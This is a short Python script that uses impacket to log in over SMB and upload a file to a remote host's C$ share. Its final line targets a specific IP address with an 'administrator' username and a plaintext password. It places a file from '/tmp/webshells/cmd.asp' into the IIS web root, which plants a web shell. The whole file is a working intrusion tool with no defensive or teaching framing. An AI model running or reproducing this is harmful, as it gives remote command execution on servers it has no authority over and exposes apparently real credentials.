import sys, os
from impacket.smbconnection import SMBConnection

def upload_shell(ip, user, password, local_file, remote_path):
    try:
        smb = SMBConnection(ip, ip)
        smb.login(user, password)
        shares = smb.listShares()
        print("Shares:", [s["shi1_name"][:-1] for s in shares])
        
        # Try C$ share
        smb.connectTree("C$")
        with open(local_file, "rb") as f:
            smb.putFile("C$", remote_path, f.read)
        print("Uploaded to %s" % remote_path)
        smb.logoff()
        return True
    except Exception as e:
        print("Error:", e)
        return False

# Test silverplus
upload_shell("113.113.81.253", "administrator", "100206", "/tmp/webshells/cmd.asp", "inetpub\wwwroot\cmd.asp")
